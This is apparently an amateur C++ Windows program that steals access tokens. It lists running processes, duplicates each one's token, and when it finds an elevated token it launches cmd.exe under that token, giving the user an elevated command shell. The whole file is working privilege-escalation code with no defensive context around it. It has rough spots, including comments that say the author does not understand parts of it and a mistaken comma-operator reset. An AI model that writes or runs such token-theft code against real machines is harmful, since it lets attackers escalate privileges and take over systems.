#include <windows.h>
#include <tlhelp32.h>

using namespace std;


int main() {
    HANDLE processListTool;
    HANDLE process;
    PROCESSENTRY32 pe32;
    wchar_t cmdline[] = L"C:\\Windows\\system32\\cmd.exe";
    HANDLE newToken = NULL;
    HANDLE duplicateNewToken = NULL;
    TOKEN_ELEVATION elevation;
    BOOL privilege, ok = FALSE;
    // IDK what is this
    DWORD dwSize;

    processListTool = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (processListTool == INVALID_HANDLE_VALUE) {
        // TODO: call GetLastError for details
//        printf("You got an error while getting list of process");
        return (FALSE);
    };

    // IDK What is this. ask about this
    pe32.dwSize = sizeof(PROCESSENTRY32);

    try {
        if (!Process32First(processListTool, &pe32)) {
            throw 0;
        }
        do {
            process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
            if (process == NULL) {
                continue;
            }
            ok = OpenProcessToken(process, TOKEN_ALL_ACCESS, &newToken);
            if (newToken == NULL) {
//                printf("there is a problem with duplicating the token");
                continue;
            }
            DuplicateTokenEx(newToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &duplicateNewToken);

            if (!GetTokenInformation(duplicateNewToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
//                printf("\nFailed to get Token Information");
                throw 2;
            }

            privilege = elevation.TokenIsElevated;
            if (privilege) {
//                printf("found the token XD");

                CreateProcessWithTokenW(duplicateNewToken, LOGON_WITH_PROFILE, NULL, cmdline, 0, NULL, NULL,
                                        NULL, NULL);
                break;
            }
            privilege, ok = FALSE;


        } while (Process32Next(processListTool, &pe32));


    }
    catch (int exceptionNum) {
        CloseHandle(processListTool);
        if (exceptionNum == 0) {
//            printf("Process32First");
        }
        return (FALSE);
    }
    catch (...) {
        CloseHandle(processListTool);
//        printf("on handled exception :)");
        return (FALSE);
    }
}
